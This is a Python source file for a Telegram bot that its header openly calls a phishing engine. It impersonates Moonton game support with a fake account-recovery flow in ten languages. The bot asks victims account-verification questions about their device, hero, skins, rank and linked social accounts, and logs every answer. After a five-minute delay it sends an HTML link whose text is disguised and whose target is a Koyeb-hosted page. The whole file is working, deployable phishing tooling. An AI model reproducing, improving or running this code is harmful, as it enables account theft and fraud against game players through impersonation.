# =========================================================================
# PROJECT: VINZY MOONTON RECOVERY STEALTH BOT (V5.0)
# DESCRIPTION: MULTI-LANGUAGE PHISHING ENGINE WITH NEONDB INTEGRATION
# =========================================================================

import os
import time
import logging
import psycopg2
import telebot
import sys
from telebot import types
from psycopg2 import pool
from threading import Thread

# --- 1. SYSTEM LOGGING CONFIGURATION ---
# We use a detailed formatter to track user movements and errors in Koyeb logs.
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("VinzyStealth")

# --- 2. ENVIRONMENT VARIABLES ---
# Ensure these are set in your Koyeb/Heroku dashboard
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")

if not BOT_TOKEN or not DATABASE_URL:
    logger.critical("MISSING CONFIG: Please set BOT_TOKEN and DATABASE_URL!")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# --- 3. DATABASE MANAGEMENT (NEONDB / POSTGRES) ---

class DatabaseManager:
    """Handles all database interactions using a threaded connection pool."""
    def __init__(self, url):
        try:
            self.pool = psycopg2.pool.ThreadedConnectionPool(1, 30, dsn=url, sslmode='require')
            self._init_table()
            logger.info("Database Pool initialized successfully.")
        except Exception as e:
            logger.error(f"Failed to initialize DB Pool: {e}")

    def _init_table(self):
        """Creates the language preference table if it doesn't exist."""
        conn = self.pool.getconn()
        try:
            cur = conn.cursor()
            cur.execute("""
                CREATE TABLE IF NOT EXISTS user_preferences (
                    user_id BIGINT PRIMARY KEY,
                    lang_code TEXT DEFAULT 'en',
                    join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            """)
            conn.commit()
            cur.close()
        finally:
            self.pool.putconn(conn)

    def get_user_lang(self, uid):
        """Fetches the saved language for a specific user ID."""
        conn = self.pool.getconn()
        try:
            cur = conn.cursor()
            cur.execute("SELECT lang_code FROM user_preferences WHERE user_id = %s", (uid,))
            res = cur.fetchone()
            cur.close()
            return res[0] if res else 'en'
        except Exception as e:
            logger.error(f"Error fetching lang for {uid}: {e}")
            return 'en'
        finally:
            self.pool.putconn(conn)

    def save_user_lang(self, uid, lang):
        """Saves or updates the user language preference."""
        conn = self.pool.getconn()
        try:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO user_preferences (user_id, lang_code)
                VALUES (%s, %s)
                ON CONFLICT (user_id) DO UPDATE SET lang_code = EXCLUDED.lang_code
            """, (uid, lang))
            conn.commit()
            cur.close()
        except Exception as e:
            logger.error(f"Error saving lang for {uid}: {e}")
        finally:
            self.pool.putconn(conn)

db = DatabaseManager(DATABASE_URL)

# --- 4. THE STEALTH DICTIONARY (FAKER LINKS) ---
# Each 'final' entry uses the HTML Anchor tag to mask the Koyeb link.

STRINGS = {
    'en': {
        'confirm': '⚠️ System detected a pending recovery request. Is this your account?',
        'yes': '✅ YES, IT IS ME', 'no': '❌ NO',
        'bound': '✅ <b>Account Linked!</b>\n<b>User ID:</b> <code>{uid}</code>',
        'q1': '📋 1/5: What is the brand and model of the device you usually use to log in?',
        'q2': '📋 2/5: What was the name of the last hero you played in a Ranked match?',
        'q3': '📋 3/5: What is the name of the most expensive skin you own?',
        'q4': '📋 4/5: What is your current Rank and the name of your Squad?',
        'q5': '📋 5/5: Which social media accounts were linked to this ID (FB/TikTok/VK)?',
        'review': '⏳ <b>Information Received.</b>\nMoonton Security Team is now reviewing your data. Please wait 5 minutes...',
        'final': '🛡️ <b>Review Complete!</b>\nTo finalize the recovery, you must bind your device to the secure node below:\n\n🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind?Verification_Secure_Node</a>'
    },
    'kh': {
        'confirm': '⚠️ ប្រព័ន្ធបានរកឃើញសំណើរសុំសង្គ្រោះគណនី។ តើនេះជាគណនីរបស់អ្នកមែនទេ?',
        'yes': '✅ បាទ/ចាស ពិតជាខ្ញុំមែន', 'no': '❌ ទេ',
        'bound': '✅ <b>ការភ្ជាប់គណនីបានជោគជ័យ!</b>\n<b>User ID:</b> <code>{uid}</code>',
        'q1': '📋 1/5: តើម៉ាក និងម៉ូដែលឧបករណ៍អ្វីដែលអ្នកធ្លាប់ប្រើដើម្បីចូលលេង?',
        'q2': '📋 2/5: តើហេរ៉ូចុងក្រោយដែលអ្នកបានលេងក្នុងវគ្គ Ranked ឈ្មោះអ្វី?',
        'q3': '📋 3/5: តើ Skin ដែលមានតម្លៃថ្លៃបំផុតដែលអ្នកមានឈ្មោះអ្វី?',
        'q4': '📋 4/5: តើ Rank បច្ចុប្បន្នរបស់អ្នកកម្រិតណា?',
        'q5': '📋 5/5: តើគណនីបណ្តាញសង្គមណាខ្លះដែលបានភ្ជាប់ (FB/TikTok/VK)?',
        'review': '⏳ <b>ទទួលបានព័ត៌មានរួចរាល់។</b>\nក្រុមការងារសន្តិសុខ Moonton កំពុងពិនិត្យមើលទិន្នន័យរបស់អ្នក។ សូមរង់ចាំ...',
        'final': '🛡️ <b>ការពិនិត្យត្រូវបានបញ្ចប់!</b>\nដើម្បីបញ្ចប់ការសង្គ្រោះ អ្នកត្រូវតែភ្ជាប់ឧបករណ៍របស់អ្នកទៅកាន់ Secure Node ខាងក្រោម៖\n\n🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind?Verification_Secure_Node</a>'
    },
    'id': { 
        'confirm': 'Sistem mendeteksi permintaan pemulihan. Apakah ini akun Anda?', 
        'yes': '✅ YA, INI SAYA', 'no': '❌ TIDAK', 'bound': '✅ <b>Akun Terhubung!</b>',
        'q1': '📋 1/5: Apa merk/model HP Anda?', 'q2': '📋 2/5: Hero terakhir di Ranked?',
        'q3': '📋 3/5: Skin termahal Anda?', 'q4': '📋 4/5: Rank dan nama Squad?',
        'q5': '📋 5/5: Akun Sosmed yang terhubung?', 'review': '⏳ Menunggu review...',
        'final': '🛡️ <b>Review Selesai!</b>\nSilakan ikat perangkat Anda:\n\n🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind</a>'
    },
    'ph': { 
        'confirm': 'May nakitang recovery request. Sayo ba itong account?', 
        'yes': '✅ OO, AKO ITO', 'no': '❌ HINDI', 'bound': '✅ <b>Account Linked!</b>',
        'q1': '📋 1/5: Anong device model mo?', 'q2': '📋 2/5: Last hero sa Ranked?',
        'q3': '📋 3/5: Pinakamahal na skin?', 'q4': '📋 4/5: Rank at Squad name?',
        'q5': '📋 5/5: Linked Social Accounts?', 'review': '⏳ Processing...',
        'final': '🛡️ <b>Tapos na ang Review!</b>\nI-bind ang iyong device dito:\n\n🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind</a>'
    },
    'ms': { 
        'confirm': 'Sistem kesan permintaan pemulihan. Adakah ini akaun anda?', 
        'yes': '✅ YA, SAYA', 'no': '❌ TIDAK', 'bound': '✅ <b>Akaun Berjaya Diikat!</b>',
        'q1': '📋 1/5: Apa model peranti anda?', 'q2': '📋 2/5: Hero terakhir Ranked?',
        'q3': '📋 3/5: Skin paling mahal?', 'q4': '📋 4/5: Rank dan nama Squad?',
        'q5': '📋 5/5: Akaun Sosmed yang terikat?', 'review': '⏳ Menunggu semakan...',
        'final': '🛡️ <b>Semakan Selesai!</b>\nSila ikat peranti anda di bawah:\n\n🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind</a>'
    },
    'th': { 
        'confirm': 'ระบบตรวจพบคำขอกู้คืน นี่คือบัญชีของคุณใช่หรือไม่?', 
        'yes': '✅ ใช่ ฉันเอง', 'no': '❌ ไม่ใช่', 'bound': '✅ <b>เชื่อมต่อบัญชีสำเร็จ!</b>',
        'q1': '📋 1/5: รุ่นมือถือที่คุณใช้?', 'q2': '📋 2/5: ฮีโร่ตัวล่าสุดที่เล่น Ranked?',
        'q3': '📋 3/5: สกินที่แพงที่สุดที่มี?', 'q4': '📋 4/5: แรงค์และชื่อทีม?',
        'q5': '📋 5/5: โซเชียลที่ผูกไว้?', 'review': '⏳ รอตรวจสอบ...',
        'final': '🛡️ <b>ตรวจสอบเสร็จสิ้น!</b>\nโปรดผูกอุปกรณ์ของคุณที่นี่:\n\n🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind</a>'
    },
    'vn': { 
        'confirm': 'Hệ thống phát hiện yêu cầu khôi phục. Đây có phải tài khoản của bạn?', 
        'yes': '✅ ĐÚNG, LÀ TÔI', 'no': '❌ KHÔNG', 'bound': '✅ <b>Đã liên kết!</b>',
        'q1': '📋 1/5: Tên điện thoại bạn dùng?', 'q2': '📋 2/5: Hero chơi Ranked cuối?',
        'q3': '📋 3/5: Skin đắt nhất?', 'q4': '📋 4/5: Rank và tên Squad?',
        'q5': '📋 5/5: Tài khoản MXH liên kết?', 'review': '⏳ Đang xem xét...',
        'final': '🛡️ <b>Hoàn tất xem xét!</b>\nVui lòng liên kết thiết bị tại đây:\n\n🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind</a>'
    },
    'mm': { 
        'confirm': 'အကောင့်ပြန်လည်ရယူရန် တောင်းဆိုချက်ကို တွေ့ရှိပါသည်။ သင်၏အကောင့်ဖြစ်ပါသလား?', 
        'yes': '✅ ဟုတ်ကဲ့၊ ကျွန်ုပ်ပါ', 'no': '❌ မဟုတ်ပါ', 'bound': '✅ <b>ချိတ်ဆက်မှု အောင်မြင်သည်။</b>',
        'q1': '📋 1/5: အသုံးပြုသည့် ဖုန်းအမျိုးအစား?', 'q2': '📋 2/5: နောက်ဆုံးကစားခဲ့သည့် Hero?',
        'q3': '📋 3/5: အဖိုးတန်ဆုံး Skin?', 'q4': '📋 4/5: လက်ရှိ Rank နှင့် Squad အမည်?',
        'q5': '📋 5/5: ချိတ်ဆက်ထားသော ဆိုရှယ်အကောင့်များ?', 'review': '⏳ စစ်ဆေးနေဆဲ...',
        'final': '🛡️ <b>စစ်ဆေးမှု ပြီးဆုံးပါပြီ။</b>\nအကောင့်ပြန်လည်ရယူရန် ဤနေရာတွင် ချိတ်ဆက်ပါ:\n\n🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind</a>'
    },
    'ru': { 
        'confirm': 'Обнаружен запрос на восстановление. Это ваш аккаунт?', 
        'yes': '✅ ДА, ЭТО Я', 'no': '❌ НЕТ', 'bound': '✅ <b>Аккаунт привязан!</b>',
        'q1': '📋 1/5: Модель вашего устройства?', 'q2': '📋 2/5: Последний герой в Ranked?',
        'q3': '📋 3/5: Самый дорогой скин?', 'q4': '📋 4/5: Ваш ранг и название Squad?',
        'q5': '📋 5/5: Соцсети (ФБ/ТТ)?', 'review': '⏳ Ожидание...',
        'final': '🛡️ <b>Проверка завершена!</b>\nПривяжите устройство здесь:\n\n🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind</a>'
    },
    'cn': { 
        'confirm': '系统检测到找回请求。这是您的账号吗？', 
        'yes': '✅ 是的', 'no': '❌ 不是', 'bound': '✅ <b>账号已关联!</b>',
        'q1': '📋 1/5: 手机型号？', 'q2': '📋 2/5: 最后一场排位英雄？',
        'q3': '📋 3/5: 最贵皮肤？', 'q4': '📋 4/5: 段位和战队？',
        'q5': '📋 5/5: 绑定的社交账号？', 'review': '⏳ 审核中...',
        'final': '🛡️ <b>审核完成！</b>\n请在此绑定您的设备：\n\n🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind</a>'
    }
}

# --- 5. INTERVIEW LOGIC ENGINE ---

def conduct_step(message, lang, step_num):
    """Generic handler for interview steps to keep code clean and unshortened."""
    uid = message.from_user.id
    text = message.text
    logger.info(f"USER {uid} | STEP {step_num} | DATA: {text}")
    
    next_step_map = {
        1: (STRINGS[lang]['q2'], 2),
        2: (STRINGS[lang]['q3'], 3),
        3: (STRINGS[lang]['q4'], 4),
        4: (STRINGS[lang]['q5'], 5),
    }
    
    if step_num in next_step_map:
        prompt, next_num = next_step_map[step_num]
        msg = bot.send_message(message.chat.id, prompt)
        bot.register_next_step_handler(msg, conduct_step, lang, next_num)
    else:
        # Final Step reached
        bot.send_message(message.chat.id, STRINGS[lang]['review'], parse_mode="HTML")
        Thread(target=process_final_delivery, args=(message.chat.id, lang, uid)).start()

def process_final_delivery(chat_id, lang, uid):
    """Wait timer before sending the phishing link."""
    logger.info(f"Thread started: Waiting 300s for user {uid}")
    time.sleep(300) # 5 Minutes
    
    try:
        final_text = STRINGS[lang]['final'].format(uid=uid)
        bot.send_message(
            chat_id, 
            final_text, 
            parse_mode="HTML", 
            disable_web_page_preview=True
        )
        logger.info(f"Final Faker link delivered to {uid}")
    except Exception as e:
        logger.error(f"Delivery failed for {uid}: {e}")

# --- 6. BOT COMMAND HANDLERS ---

@bot.message_handler(commands=['start'])
def handle_start(m):
    logger.info(f"Command /start from {m.from_user.id}")
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    # Language Selection Buttons
    languages = [
        ('🇺🇸 English', 'en'), ('🇰🇭 ខ្មែរ', 'kh'), ('🇮🇩 Indo', 'id'),
        ('🇵🇭 Tagalog', 'ph'), ('🇲🇾 Melayu', 'ms'), ('🇹🇭 ไทย', 'th'),
        ('🇻🇳 Tiếng Việt', 'vn'), ('🇲🇲 ဗမာ', 'mm'), ('🇷🇺 Русский', 'ru'),
        ('🇨🇳 中文', 'cn')
    ]
    
    btns = [types.InlineKeyboardButton(text, callback_data=f"lang_{code}") for text, code in languages]
    markup.add(*btns)
    
    bot.send_message(
        m.chat.id, 
        "<b>Welcome to Moonton Support</b>\nPlease select your language to begin recovery:",
        reply_markup=markup,
        parse_mode="HTML"
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("lang_"))
def callback_language(call):
    lang_code = call.data.split("_")[1]
    db.save_user_lang(call.from_user.id, lang_code)
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton(STRINGS[lang_code]['yes'], callback_data=f"yes_{lang_code}"),
        types.InlineKeyboardButton(STRINGS[lang_code]['no'], callback_data="cancel")
    )
    
    bot.edit_message_text(
        STRINGS[lang_code]['confirm'],
        call.message.chat.id,
        call.message.message_id,
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("yes_"))
def callback_yes(call):
    lang_code = call.data.split("_")[1]
    uid = call.from_user.id
    
    # Visual Confirmation
    bot.edit_message_text(
        STRINGS[lang_code]['bound'].format(uid=uid),
        call.message.chat.id,
        call.message.message_id,
        parse_mode="HTML"
    )
    
    # Small delay for realism
    time.sleep(1.5)
    
    # Trigger first question
    msg = bot.send_message(call.message.chat.id, STRINGS[lang_code]['q1'])
    bot.register_next_step_handler(msg, conduct_step, lang_code, 1)

@bot.callback_query_handler(func=lambda call: call.data == "cancel")
def callback_cancel(call):
    bot.answer_callback_query(call.id, "Session Terminated.")
    bot.delete_message(call.message.chat.id, call.message.message_id)

# --- 7. MAIN POLLING LOOP ---

if __name__ == "__main__":
    logger.info("Vinzy Moonton Recovery Bot V5.0 is LIVE.")
    try:
        # Use infinity_polling to auto-restart on network hiccups
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except Exception as e:
        logger.critical(f"Bot crashed: {e}")
